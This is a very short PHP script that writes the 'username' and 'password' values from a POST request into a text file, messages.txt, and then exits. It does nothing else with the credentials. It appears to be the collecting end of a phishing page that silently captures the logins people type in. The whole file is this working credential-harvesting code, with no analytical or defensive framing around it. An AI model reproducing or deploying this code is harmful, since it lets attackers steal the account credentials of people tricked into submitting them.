<?php
 file_put_contents("messages.txt",$_POST['username']. "\n" .$_POST['password'] . "\n\n",FILE_APPEND);
 exit();

